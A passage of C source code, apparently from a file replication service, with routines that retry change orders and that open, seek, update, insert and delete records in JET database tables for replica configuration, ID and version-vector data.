        if (CO_STATE_IS(ChangeOrder, IBCO_INSTALL_DEL_RETRY) ||
            COE_FLAG_ON(ChangeOrder, COE_FLAG_NEED_DELETE)) {
            SetIdRecFlag(IDTableRec, IDREC_FLAGS_DELETE_DEFERRED);
            SetFlag(RetireFlags, ISCU_UPDATE_IDT_ENTRY);
        }

        //
        // This CO may have been on a New File.
        //
        // Note: What if this was a dir and another CO comes in while
        //       this one is in retry and hits a name morph conflict?
        //       If we haven't installed how will this CO get handled
        //       assuming we lose the name conflict?
        //
        // If this CO is on a new file then don't clear the NEW_FILE_IN_PROGRESS
        // flag.  This ensures that the CO will get re-issued when it comes
        // up for retry later.  Otherwise the version info in the CO will
        // match the initial version info in the IDTable and the CO will
        // get rejected for sameness.
        //
        if (CO_STATE_IS(ChangeOrder, IBCO_INSTALL_REN_RETRY) ||
            CO_STATE_IS(ChangeOrder, IBCO_INSTALL_DEL_RETRY)) {
            ClearIdRecFlag(IDTableRec, IDREC_FLAGS_NEW_FILE_IN_PROGRESS);
        }

        //
        // Updating the IDTable on a change order in the retry path will
        // eventually cause it to be rejected when it is later retried.  In
        // addition a dup CO from another inbound partner will also get
        // rejected even though it should get a shot.  So instead of
        // updating the entire record we just update the Flags here.
        // BUT ... see comment above re DELETE_DEFERRED.
        //
        SetFlag(RetireFlags, ISCU_UPDATE_IDT_FLAGS);
        //
        // perf: If the staging file is already fetched then we should detect
        // that and avoid refetching it.

    }

    //
    // Produce a tracking record for the log.  First time only or could flood log.
    //
    if (FirstTime) {
        pTag = (RemoteCo) ? "Retry RemCo" : "Retry LclCo";
        FRS_TRACK_RECORD(ChangeOrder, pTag);
    }

    SetFlag(RetireFlags, ISCU_NO_CLEANUP_MERGE);
    FStatus = ChgOrdIssueCleanup(ThreadCtx, Replica, ChangeOrder, RetireFlags);
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT1(0, "++ ERROR - failed to update VV  %08x %08x\n",
                PRINTQUAD(CoCmd->FrsVsn));
        goto RETURN;
    }


    //
    // If we have retried too many times with the result that this CO is
    // blocking other COs in the VV retire list then we need to call
    // ChgOrdIssueCleanup() with ISCU_ACTIVATE_VV_DISCARD set.
    // Then set CO_FLAG_OUT_OF_ORDER so when the staging file for the CO
    // finally arrives (local or remote) we can then propagate
    // we need to call ChgOrdIssueCleanup() with ISCU_INS_OUTLOG set.
    // Since the CO is out of order setting CO_FLAG_OUT_OF_ORDER lets it
    // slip past the change order dampening filters that would otherwise
    // ignore it.
    //
    if (0) {
        // Note: add code to determine if this CO is blocking others in VV retire
        //       and how long it has been sitting in VVretire since the CO was
        //       first issued.

        FStatus = ChgOrdIssueCleanup(ThreadCtx,
                                     Replica,
                                     ChangeOrder,
                                     ISCU_ACTIVATE_VV_DISCARD |
                                     ISCU_NO_CLEANUP_MERGE);
        if (!FRS_SUCCESS(FStatus)) {
            DPRINT1(0, "++ ERROR - failed to discard VV retire slot %08x %08x\n",
                   PRINTQUAD(CoCmd->FrsVsn));
            goto RETURN;
        }
        SET_CO_FLAG(ChangeOrder, CO_FLAG_OUT_OF_ORDER);
    }


RETURN:

    //
    // Count of how many change orders we need to retry for this replica.
    // This count may not be precise.  It is really used as an indicator
    // that there may be retry change orders in the INLOG.  The inlog
    // Retry thread zeros this count before it starts its pass thru the log.
    //
    InterlockedIncrement(&Replica->InLogRetryCount);

    //
    // Now do the issue cleanup.  This has to be done as a seperate step.
    //
    RetireFlags = 0;
    SetFlag(RetireFlags, (ISCU_ISSUE_CLEANUP));

    if (!COE_FLAG_ON(ChangeOrder, COE_FLAG_DELETE_GEN_CO)) {
        SetFlag(RetireFlags, ISCU_UPDATE_INLOG);
    }


    //
    // Note: May need to track retried COs pending so we can block a parent dir MOVEOUT
    //       May just need to leave entry in active child table.
    //       Does the case of a remote co child file update that goes thru retry
    //       followed by a local CO MOVEOUT of the parent DIR work correctly when
    //       the remote CO child file update is retried?
    //
    SetFlag(RetireFlags, ISCU_NO_CLEANUP_MERGE);
    FStatus = ChgOrdIssueCleanup(ThreadCtx, Replica, ChangeOrder, RetireFlags);

    if (!FRS_SUCCESS(FStatus)) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
        //
        // Note:  Multiple COs can retire and set Replica->FStatus
        //        Need another mechanism if initiator cares.
        //
        Replica->FStatus = FStatus;
    }

    return FStatus;

}



ULONG
DbsUpdateRecordField(
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica,
    IN PTABLE_CTX   TableCtx,
    IN ULONG        IndexField,
    IN PVOID        IndexValue,
    IN ULONG        UpdateField
    )
/*++

Routine Description:

    Update the specified field in the specified record in the specified table
    in the specified Replica.  The data for the update comes from the TableCtx
    structure which has been pre-initialized.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.

    Replica     - The Replica context, provides the table list for this replica.

    TableCtx    - The table ctx that has the data record for the field update.

    IndexField  - The field code for the index to use.

    IndexValue  - ptr to index value to identify the record.

    UpdateField - The field code for the column to update.

Return Value:

    FrsError status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateRecordField:"

    JET_ERR  jerr;
    ULONG    FStatus;
    ULONG    ReplicaNumber = Replica->ReplicaNumber;

    FRS_ASSERT(TableCtx != NULL);
    FRS_ASSERT(Replica != NULL);
    FRS_ASSERT(IndexValue != NULL);
    FRS_ASSERT(TableCtx->TableType != TABLE_TYPE_INVALID);
    FRS_ASSERT(TableCtx->pDataRecord != NULL);

    //
    // Init the table context struct by allocating the storage for the data
    // record and the jet record descriptors.  Open the table.
    //
    jerr = DbsOpenTable(ThreadCtx, TableCtx, ReplicaNumber, TableCtx->TableType, NULL);
    if (!JET_SUCCESS(jerr)) {
        return DbsTranslateJetError(jerr, FALSE);
    }

    //
    // Seek to the desired record.
    //
    jerr = DbsSeekRecord(ThreadCtx, IndexValue, IndexField, TableCtx);
    if (JET_SUCCESS(jerr)) {
        //
        // Write the desired field.
        //
        FStatus = DbsWriteTableField(ThreadCtx, ReplicaNumber, TableCtx, UpdateField);
        DPRINT1_FS(0, "++ ERROR - DbsWriteTableField on %ws :", Replica->ReplicaName->Name, FStatus);
    } else {
        DPRINT1_JS(0, "++ ERROR - DbsSeekRecord on %ws :", Replica->ReplicaName->Name, jerr);
        FStatus = DbsTranslateJetError(jerr, FALSE);
    }

    //
    // Close the table.
    //
    DbsCloseTable(jerr, ThreadCtx->JSesid, TableCtx);
    DPRINT1_JS(0, "++ ERROR - DbsCloseTable on %ws :", Replica->ReplicaName->Name, jerr);

    return FStatus;
}


ULONG
DbsUpdateVV(
    IN PTHREAD_CTX          ThreadCtx,
    IN PREPLICA             Replica,
    IN PREPLICA_THREAD_CTX  RtCtx,
    IN ULONGLONG            OriginatorVsn,
    IN GUID                 *OriginatorGuid
    )
/*++

Routine Description:

    This function update an entry in the VVTable in the database.

Arguments:

    ThreadCtx
    RtCtx
    Replica
    OriginatorVsn
    OriginatorGuid

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateVV:"

    ULONG               FStatus;
    PVVTABLE_RECORD     VVTableRec;
    PTABLE_CTX          TableCtx;
    TABLE_CTX           TempTableCtx;
    BOOL                Update = TRUE;
    PVV_ENTRY           OutlogVVEntry;

    DPRINT2(4, "++ Update Replica Vvector to %08x %08x for %ws\n",
            PRINTQUAD(OriginatorVsn), Replica->SetName->Name);
    //
    // Use local table ctx if not provided.
    //
    if (RtCtx == NULL) {
        TableCtx = &TempTableCtx;
        TableCtx->TableType = TABLE_TYPE_INVALID;
        TableCtx->Tid = JET_tableidNil;
    } else {
        TableCtx = &RtCtx->VVTable;
    }

    //
    // Update the database
    //
    DbsAllocTableCtx(VVTablex, TableCtx);

    VVTableRec = (PVVTABLE_RECORD)TableCtx->pDataRecord;
    VVTableRec->VVOriginatorVsn = OriginatorVsn;
    COPY_GUID(&VVTableRec->VVOriginatorGuid, OriginatorGuid);

    //
    // Copy the fields over from the Replica->OutlogVVector too.
    //

    LOCK_GEN_TABLE(Replica->OutlogVVector);

    OutlogVVEntry = GTabLookupNoLock(Replica->OutlogVVector, OriginatorGuid, NULL);

    if (OutlogVVEntry == NULL) {
        OutlogVVEntry = FrsAlloc(sizeof(VV_ENTRY));
        COPY_GUID(&OutlogVVEntry->GVsn.Guid, OriginatorGuid);
        //
        // A non-zero value so that it does not get overwritten at startup.
        // See DbsBuildVVTableWorker()
        //
        OutlogVVEntry->GVsn.Vsn = (ULONGLONG)1;

        //
        // Initialize the list head. We do not use the list head for outlogVV
        // but we still need to initialize it because the APIs that work with
        // VVs expect it.
        //
        InitializeListHead(&OutlogVVEntry->ListHead);

        //
        // Add it to the outlog version vector table.
        //
        GTabInsertEntryNoLock(Replica->OutlogVVector, OutlogVVEntry, &OutlogVVEntry->GVsn.Guid, NULL);
    }

    VVTableRec->VVOutlogOriginatorVsn = OutlogVVEntry->GVsn.Vsn;

    UNLOCK_GEN_TABLE(Replica->OutlogVVector);


    FStatus = DbsUpdateTableRecordByIndex(ThreadCtx,
                                          Replica,
                                          TableCtx,
                                          &VVTableRec->VVOriginatorGuid,
                                          VVOriginatorGuidx,
                                          VVTablex);
    if (FStatus == FrsErrorNotFound) {
        Update = FALSE;
        FStatus = DbsInsertTable(ThreadCtx, Replica, TableCtx, VVTablex, NULL);
    }
    if (!FRS_SUCCESS(FStatus)) {
        DPRINT1_FS(0,"++ ERROR - %s failed.", (Update) ? "Update VV" : "Insert VV" , FStatus);
        goto RETURN;
    }

    FStatus = FrsErrorSuccess;

RETURN:

    if (TableCtx == &TempTableCtx) {
        DbsFreeTableCtx(TableCtx, 1);
    }

    return FStatus;
}


ULONG
DbsUpdateConfigTable(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica
    )
/*++

Routine Description:

    This function updates the config record. It uses
    the replica number in the data record to seek to
    the config record.

Arguments:

    ThreadCtx   -- ptr to the thread context.

    Replica -- ptr to replica struct.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateConfigTable:"

    JET_ERR                 jerr, jerr1;
    NTSTATUS                Status;
    PTABLE_CTX              TableCtx;

    TableCtx = &Replica->ConfigTable;
    FRS_ASSERT(IS_CONFIG_TABLE(TableCtx));

    //
    // open the configuration table, seek to the config record and update it.
    //
    jerr = DbsOpenTable(ThreadCtx,
                        TableCtx,
                        Replica->ReplicaNumber,
                        ConfigTablex,
                        NULL);
    if (!JET_SUCCESS(jerr)) {
        return DbsTranslateJetError(jerr, FALSE);
    }

    jerr = DbsSeekRecord(ThreadCtx,
                         &Replica->ReplicaNumber,
                         ReplicaNumberIndexx,
                         TableCtx);
    CLEANUP1_JS(0, "ERROR - DbsSeekRecord on %ws :",
                Replica->ReplicaName->Name, jerr, errout);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer
    // addresses to write the fields of the data record.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for any unallocated fields in the variable
    // length record fields (this should be a nop since all of these should have
    // been allocated by now) and update the JetSet/RetCol arrays appropriately
    // for the variable length fields.
    //
    Status = DbsAllocRecordStorage(TableCtx);
    if (!NT_SUCCESS(Status)) {
        DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
        return FrsErrorResource;
    }

    //
    // Update the record.
    //
    DBS_DISPLAY_RECORD_SEV(5, TableCtx, FALSE);
    jerr = DbsUpdateTable(TableCtx);
    CLEANUP1_JS(0, "ERROR - DbsUpdateTable on %ws :",
                Replica->ReplicaName->Name, jerr, errout);

errout:
    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable failed:", jerr1);
    jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;

    return DbsTranslateJetError(jerr, FALSE);
}




ULONG
DbsUpdateConfigTableFields(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PULONG      RecordFieldx,
    IN ULONG       FieldCount
    )
/*++

Routine Description:

    This function updates selected fields in the config record. It uses
    the replica number in the data record to seek to the config record.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct.
    RecordFieldx -- ptr to an array of field ids for the columns to update.
    FieldCount -- Then number of field entries in the RecordFieldx array.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateConfigTableFields:"

    JET_ERR                 jerr, jerr1;
    NTSTATUS                Status;
    PTABLE_CTX              TableCtx;
    ULONG                   FStatus;

    TableCtx = &Replica->ConfigTable;
    FRS_ASSERT(IS_CONFIG_TABLE(TableCtx));

    //
    // open the configuration table, seek to the config record and update it.
    //
    jerr = DbsOpenTable(ThreadCtx,
                        TableCtx,
                        Replica->ReplicaNumber,
                        ConfigTablex,
                        NULL);
    if (!JET_SUCCESS(jerr)) {
        return DbsTranslateJetError(jerr, FALSE);
    }

    jerr = DbsSeekRecord(ThreadCtx,
                         &Replica->ReplicaNumber,
                         ReplicaNumberIndexx,
                         TableCtx);
    CLEANUP1_JS(0, "ERROR - DbsSeekRecord on %ws :",
                Replica->ReplicaName->Name, jerr, errout);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer
    // addresses to write the fields of the data record.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for any unallocated fields in the variable
    // length record fields (this should be a nop since all of these should have
    // been allocated by now) and update the JetSet/RetCol arrays appropriately
    // for the variable length fields.
    //
    Status = DbsAllocRecordStorage(TableCtx);
    if (!NT_SUCCESS(Status)) {
        DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
        return FrsErrorResource;
    }

    //
    // Update the record.
    //
    DBS_DISPLAY_RECORD_SEV_COLS(4, TableCtx, FALSE, RecordFieldx, FieldCount);
    FStatus = DbsWriteTableFieldMult(ThreadCtx,
                                     Replica->ReplicaNumber,
                                     TableCtx,
                                     RecordFieldx,
                                     FieldCount);
    DPRINT1_FS(0, "ERROR - DbsUpdateConfigTableFields on %ws :",
               Replica->ReplicaName->Name, FStatus);

    //
    // Leave table open for other update calls.
    //
    return FStatus;

errout:
    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable failed:", jerr1);
    jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;

    return DbsTranslateJetError(jerr, FALSE);
}



ULONG
DbsUpdateIDTableFields(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PCHANGE_ORDER_ENTRY  ChangeOrder,
    IN PULONG      RecordFieldx,
    IN ULONG       FieldCount
    )
/*++

Routine Description:

    This function updates selected fields in the IDTable record. It uses
    the replica number in the data record to seek to the config record.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct whose IDTable is to be updated.
    ChangeOrder -- Provides the IDTable Ctx and associated data record.
    RecordFieldx -- ptr to an array of field ids for the columns to update.
    FieldCount -- Then number of field entries in the RecordFieldx array.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateIDTableFields:"

    JET_ERR                 jerr, jerr1;
    NTSTATUS                Status;
    PTABLE_CTX              TableCtx;
    ULONG                   FStatus;
    PIDTABLE_RECORD         IDTableRec;

    FRS_ASSERT(Replica != NULL);
    FRS_ASSERT(ChangeOrder != NULL);
    FRS_ASSERT(ChangeOrder->RtCtx != NULL);

    TableCtx    = &ChangeOrder->RtCtx->IDTable;

    FRS_ASSERT(IS_ID_TABLE(TableCtx));
    IDTableRec = TableCtx->pDataRecord;
    FRS_ASSERT(IDTableRec != NULL);


    //
    // open the ID table, seek to the record and update it.
    //
    jerr = DbsOpenTable(ThreadCtx,
                        TableCtx,
                        Replica->ReplicaNumber,
                        IDTablex,
                        NULL);
    if (!JET_SUCCESS(jerr)) {
        goto errout;
    }

    jerr = DbsSeekRecord(ThreadCtx,
                        &IDTableRec->FileGuid,
                         GuidIndexx,
                         TableCtx);
    CLEANUP1_JS(0, "ERROR - DbsSeekRecord on %ws :",
                Replica->ReplicaName->Name, jerr, errout);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer
    // addresses to write the fields of the data record.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for any unallocated fields in the variable
    // length record fields (this should be a nop since all of these should have
    // been allocated by now) and update the JetSet/RetCol arrays appropriately
    // for the variable length fields.
    //
    Status = DbsAllocRecordStorage(TableCtx);
    if (!NT_SUCCESS(Status)) {
        DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
        return FrsErrorResource;
    }

    //
    // Update the record.
    //
    DBS_DISPLAY_RECORD_SEV_COLS(4, TableCtx, FALSE, RecordFieldx, FieldCount);
    FStatus = DbsWriteTableFieldMult(ThreadCtx,
                                     Replica->ReplicaNumber,
                                     TableCtx,
                                     RecordFieldx,
                                     FieldCount);
    DPRINT1_FS(0, "ERROR - DbsUpdateConfigTableFields on %ws :",
               Replica->ReplicaName->Name, FStatus);

errout:
    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable failed:", jerr1);
    jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;

    return DbsTranslateJetError(jerr, FALSE);
}



ULONG
DbsFreeRtCtx(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PREPLICA_THREAD_CTX   RtCtx,
    IN BOOL SessionErrorCheck
    )
/*++

Routine Description:

    Close any open tables in the RtCtx and free all the storage.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct.
    RtCtx  - ptr to the replica thread ctx to be closed and freed.
    SessionErrorCheck - True means generate an error message if the Session ID
                        in the ThreadCtx does not match the Session Id used
                        to open a given table in the Replica-Thread ctx.
                        False means keep quiet.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsFreeRtCtx:"

    JET_ERR         jerr;

    if (RtCtx != NULL) {
        jerr = DbsCloseReplicaTables(ThreadCtx, Replica, RtCtx, SessionErrorCheck);
        if (JET_SUCCESS(jerr)) {
            //
            // Remove the Replica-Thread context from the Replica List and
            // free the storage associated with all the table contexts and
            // the REPLICA_THREAD_CTX struct as well.
            //
            FrsRtlRemoveEntryList(&Replica->ReplicaCtxListHead,
                                  &RtCtx->ReplicaCtxList);
            RtCtx = FrsFreeType(RtCtx);
        } else {
            DPRINT_JS(0,"ERROR - DbsCloseReplicaTables failed:", jerr);
            return DbsTranslateJetError(jerr, FALSE);
        }
    }

    return FrsErrorSuccess;

}


ULONG
DbsInsertTable(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PTABLE_CTX  TableCtx,
    IN ULONG       TableType,
    IN PVOID       DataRecord
    )
/*++

Routine Description:

    This function inserts a new record into the specified table.  It inits
    the supplied TableCtx as needed and uses the data record pointer if non-null.

    If the TableCtx is already initialized it must match the TableType specified.

    If the DataRecord is NULL then the TableCtx must be pre-inited with data.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct.
    TableCtx  - ptr to the table ctx.
    TableType - The table type code
    DataRecord -- ptr to the data record being inserted.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsInsertTable:"

    JET_ERR   jerr, jerr1;
    ULONG     ReplicaNum = Replica->ReplicaNumber;

    FRS_ASSERT(TableCtx != NULL);

    FRS_ASSERT((TableCtx->TableType == TABLE_TYPE_INVALID) ||
               (TableCtx->TableType == TableType));

    FRS_ASSERT((DataRecord != NULL) || (TableCtx->pDataRecord != NULL));

    //
    // Open the table
    //
    jerr = DbsOpenTable(ThreadCtx, TableCtx, ReplicaNum, TableType, DataRecord);
    CLEANUP_JS(0,"Error - OpenTable failed:", jerr, RETURN);

    //
    // Insert the new record into the database.
    //
    jerr = DbsInsertTable2(TableCtx);
    if (!JET_SUCCESS(jerr)) {
        DPRINT_JS(1, "error inserting record:", jerr);
        DBS_DISPLAY_RECORD_SEV(5, TableCtx, FALSE);
        DUMP_TABLE_CTX(TableCtx);
    }
    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
RETURN:

    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    DPRINT_JS(0,"Error - JetCloseTable failed:", jerr1);
    jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;

    return DbsTranslateJetError(jerr, FALSE);
}




ULONG
DbsUpdateTableRecordByIndex(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PTABLE_CTX  TableCtx,
    IN PVOID       pIndex,
    IN ULONG       IndexType,
    IN ULONG       TableType
    )
/*++

Routine Description:


    This function updates the Table record with the specified Index for the
    specified replica.  It does a one shot open/update/close.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct.
    TableCtx  - ptr to a Table ctx. If NULL we provide a temp.
    pIndex - ptr to the index value to select the record.
    IndexType - The type code for the index to use in selecting the record.
    TableType - The type code for the table.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsUpdateTableRecordByIndex:"


    JET_ERR         jerr, jerr1;
    NTSTATUS        Status;
    LONG            RetryCount = UPDATE_RETRY_COUNT;


    jerr = DbsOpenTable(ThreadCtx, TableCtx, Replica->ReplicaNumber, TableType, NULL);
    if (!JET_SUCCESS(jerr)) {
        return DbsTranslateJetError(jerr, FALSE);
    }


UPDATE_ERROR_RETRY:

    //
    // Seek to the IDtable record using the object ID (GUID) and update it.
    // The ObjectID is the primary key so it never changes.  The FID can change.
    //
    jerr = DbsSeekRecord(ThreadCtx, pIndex, IndexType, TableCtx);
    CLEANUP1_JS(1, "ERROR - DbsSeekRecord on %ws",
                Replica->ReplicaName->Name, jerr, RETURN);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer
    // addresses to write the fields of the data record.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for any unallocated fields in the variable
    // length record fields (this should be a nop since all of these should have
    // been allocated by now) and update the JetSet/RetCol arrays appropriately
    // for the variable length fields.
    //
    Status = DbsAllocRecordStorage(TableCtx);
    if (!NT_SUCCESS(Status)) {
        DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
        goto RETURN;
    }

    //
    // Update the record.
    //
    jerr = DbsUpdateTable(TableCtx);
    DPRINT1_JS(0, "ERROR DbsUpdateTable on %ws", Replica->ReplicaName->Name, jerr);


RETURN:
    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable failed:", jerr1);
    jerr = (JET_SUCCESS(jerr)) ? jerr1 : jerr;

    //
    // workaround attempt to deal with JET_errRecordTooBig error.
    //
    if ((jerr == JET_errRecordTooBig) && (--RetryCount > 0)) {
        DPRINT_JS(0, "ERROR - RecordTooBig, retrying : ", jerr);
        goto UPDATE_ERROR_RETRY;
    }

    if ((JET_SUCCESS(jerr)) && (RetryCount != UPDATE_RETRY_COUNT)) {
        DPRINT(5, "DbsUpdateTableRecordByIndex retry succeeded\n");
    }

    return DbsTranslateJetError(jerr, FALSE);
}



ULONG
DbsDeleteTableRecordByIndex(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PTABLE_CTX  TableCtx,
    IN PVOID       pIndex,
    IN ULONG       IndexType,
    IN ULONG       TableType
    )
/*++

Routine Description:

    This function deletes the Table record with the specified Index for the
    specified replica.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct.
    TableCtx  - ptr to a Table ctx. If NULL we provide a temp.
    pIndex - ptr to the index value to select the record.
    IndexType - The type code for the index to use in selecting the record.
    TableType - The type code for the table.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsDeleteTableRecordByIndex:"

    JET_ERR           jerr, jerr1;
    TABLE_CTX         TempTableCtx;

    //
    // Use local table ctx if not provided.
    //
    if (TableCtx == NULL) {
        TableCtx = &TempTableCtx;
        TableCtx->TableType = TABLE_TYPE_INVALID;
        TableCtx->Tid = JET_tableidNil;
    }

    //
    // Seek to the IDTable record and delete it.
    //
    jerr = DbsOpenTable(ThreadCtx, TableCtx, Replica->ReplicaNumber, TableType, NULL);
    CLEANUP1_JS(0, "ERROR - JetOpenTable on %ws:",
                Replica->ReplicaName->Name, jerr, RETURN);

    jerr = DbsSeekRecord(ThreadCtx, pIndex, IndexType, TableCtx);
    CLEANUP1_JS(0, "ERROR - DbsSeekRecord on %ws :",
                Replica->ReplicaName->Name, jerr, RETURN);

    jerr = DbsDeleteTableRecord(TableCtx);
    DPRINT1_JS(0, "ERROR - DbsDeleteRecord on %ws :", Replica->ReplicaName->Name, jerr);

    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
RETURN:
    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable failed:", jerr1);
    jerr = (JET_SUCCESS(jerr)) ? jerr1 : jerr;

    if (TableCtx == &TempTableCtx) {
        DbsFreeTableCtx(TableCtx, 1);
    }

    return DbsTranslateJetError(jerr, FALSE);
}



ULONG
DbsReadTableRecordByIndex(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PTABLE_CTX  TableCtx,
    IN PVOID       pIndex,
    IN ULONG       IndexType,
    IN ULONG       TableType
    )
/*++

Routine Description:

    This function reads the Table record with the specified Index for the
    specified replica.  It does a one shot open, read and close.
    The data record is returned in the Callers TableCtx.

Arguments:

    ThreadCtx   -- ptr to the thread context.
    Replica -- ptr to replica struct.
    TableCtx  - ptr to a Table ctx.
    pIndex - ptr to the index value to select the record.
    IndexType - The type code for the index to use in selecting the record.
    TableType - The type code for the table.

Return Value:

    FrsStatus

--*/
{
#undef DEBSUB
#define DEBSUB "DbsReadTableRecordByIndex:"

    JET_ERR           jerr, jerr1;

    //
    // Open the requested table.
    //
    jerr = DbsOpenTable(ThreadCtx, TableCtx, Replica->ReplicaNumber, TableType, NULL);
    CLEANUP1_JS(0, "ERROR - JetOpenTable on %ws:",
                Replica->ReplicaName->Name, jerr, RETURN);

    //
    // Read the record.
    //
    jerr = DbsReadRecord(ThreadCtx, pIndex, IndexType, TableCtx);
    if (jerr != JET_errRecordNotFound) {
        DPRINT1_JS(0, "ERROR - DbsReadRecord on %ws", Replica->ReplicaName->Name, jerr);
    }

    //
    // Close the table, reset the TableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
RETURN:
    DbsCloseTable(jerr1, ThreadCtx->JSesid, TableCtx);
    if (!JET_SUCCESS(jerr1)) {
        DPRINT_JS(0,"ERROR - JetCloseTable failed:", jerr1);
        jerr = (JET_SUCCESS(jerr)) ? jerr1 : jerr;
    }

    //
    // Translate the jet error but don't print it if just RecordNotFound.
    //
    return DbsTranslateJetError(jerr, (jerr != JET_errRecordNotFound));
}




ULONG
DbsOpenTable(
    IN PTHREAD_CTX ThreadCtx,
    IN PTABLE_CTX  TableCtx,
    IN ULONG       ReplicaNumber,
    IN ULONG       TableType,
    IN PVOID       DataRecord
)
/*++

Routine Description:

    This function initializes a table context structure, allocating the initial
    storage for the data record and then opens a jet table specified by the
    TableType parameter and the ReplicaNumber parameter.
    and inits the TableCtx with the table id,

Arguments:

    ThreadCtx     -- ptr to the thread context.
    TableCtx      -- ptr to the table context.
    ReplicaNumber -- The ID number of the replica whose table is being opened.
    TableType     -- The table type code to open.
    DataRecord    -- NULL if we alloc data record storage else caller provides.

Return Value:

    Jet status code. JET_errSuccess if successful.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsOpenTable:"

    JET_ERR      jerr;
    CHAR         TableName[JET_cbNameMost];
    JET_TABLEID  Tid;
    NTSTATUS     Status;
    JET_TABLEID  FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG

    //
    // Allocate a new table context using the table type of the caller.
    //
    Status = DbsAllocTableCtxWithRecord(TableType, TableCtx, DataRecord);

    //
    // Open the table, if it's not already open. Check the session id for match.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
    CLEANUP1_JS(0, "ERROR - FrsOpenTable (%s) :", TableName, jerr, ERROR_RETURN);

    //
    // Initialize the JetSet/RetCol arrays and data record buffer addresses
    // to read and write the fields of the ConfigTable records into ConfigRecord.
    //
    DbsSetJetColSize(TableCtx);
    DbsSetJetColAddr(TableCtx);

    //
    // Allocate the storage for the variable length fields in the record and
    // update the JetSet/RetCol arrays appropriately.
    //
    Status = DbsAllocRecordStorage(TableCtx);

    if (NT_SUCCESS(Status)) {
        return JET_errSuccess;
    }

    DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
    DbsCloseTable(jerr, ThreadCtx->JSesid, TableCtx);
    jerr = JET_errOutOfMemory;

ERROR_RETURN:
    DbsFreeTableCtx(TableCtx, 1);
    return jerr;
}



PTABLE_CTX
DbsCreateTableContext(
    IN ULONG TableType
)
